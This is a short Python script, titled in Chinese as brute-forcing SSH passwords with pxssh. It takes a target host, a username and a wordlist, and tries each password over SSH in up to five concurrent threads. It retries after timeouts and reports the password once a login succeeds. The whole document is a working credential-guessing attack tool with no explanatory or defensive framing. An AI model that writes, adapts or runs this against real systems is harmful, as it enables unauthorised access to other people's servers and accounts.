# 利用pxssh暴力破解ssh密码

from pexpect import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock=BoundedSemaphore(value=maxConnections)
Found=False
Fails=0
def connect(host,user,password,release):
    global Found
    global Fails
    try:
        s= pxssh.pxssh()
        s.login(host,user,password)
        print('[] Password was founded :'+password)
        Found=True
    except  Exception as e:
        if 'read_nonblocking' in str(e):
            Fails+=1
            time.sleep(5)
            connect(host,user,password,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,password,False)
    finally:
        if release:
            connection_lock.release()
def main():
    parser=optparse.OptionParser('usage %prog'+'-H <target host> -u <user> -F <password list>')
    parser.add_option('-H',dest='tgthost',type='string',help='specify target host')
    parser.add_option('-u',dest='user',type='string',help='specify the user ')
    parser.add_option('-F',dest='passwordFile',type='string',help='specify password file')
    (options,args)=parser.parse_args()
    host=options.tgthost
    user=options.user
    passwordFile=options.passwordFile
    if host==None or user==None or passwordFile==None:
        print(parser.usage)
        exit(0)
    with open(passwordFile,'r') as fn:
        for line in fn.readlines():
            if Found:
                print('[*] Exiting : Password Found ')
                exit(0)
            if Fails>5:
                print('[!] Exiting : Too many socket Timeouts')
                exit(0)
            connection_lock.acquire()
            password=line.strip('\r\n')
            print('[-] Testing : '+str(password))
            t=Thread(target=connect,args=(host,user,password,True))
            child=t.start()
    print(Fails)
if __name__ == '__main__':
    main()





